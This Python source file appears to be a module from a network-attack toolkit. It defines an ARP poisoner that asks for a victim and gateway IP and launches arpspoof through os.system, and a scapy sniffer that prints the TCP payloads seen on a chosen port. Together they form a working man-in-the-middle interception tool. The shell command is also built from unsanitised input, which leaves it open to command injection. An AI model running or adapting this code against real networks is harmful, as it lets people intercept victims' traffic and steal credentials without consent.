import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os


def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    intf = loop_input(out_lck, "Please insert interface's name: ")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayip = loop_input(out_lck, "Please insert gateway IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, victimip, gatewayip))


def analyzer(out_lck):

    output(out_lck, "Analizer")

    protocol = loop_input(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")

    port = loop_int_input(out_lck, "Please insert port number: ")

    a = sniff(filter="%s and port %s" % (protocol, port), prn=lambda x: x[TCP].payload)

